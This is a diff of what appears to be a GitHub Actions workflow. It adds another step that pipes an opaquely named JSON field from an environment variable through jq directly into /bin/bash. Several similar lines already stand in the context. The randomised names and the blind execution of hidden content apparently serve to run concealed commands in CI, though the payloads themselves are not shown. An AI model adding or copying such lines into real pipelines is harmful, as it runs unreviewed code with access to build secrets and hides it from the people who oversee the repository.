@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$lt8" | jq -r .b32 | /bin/bash
           echo $uk12 | jq -r .omsok8362 | /bin/bash
           echo $wsj70635 | jq -r .ntjbz6847 | /bin/bash
+          printf '%s' "$k9" | jq -r .bgmbm83 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
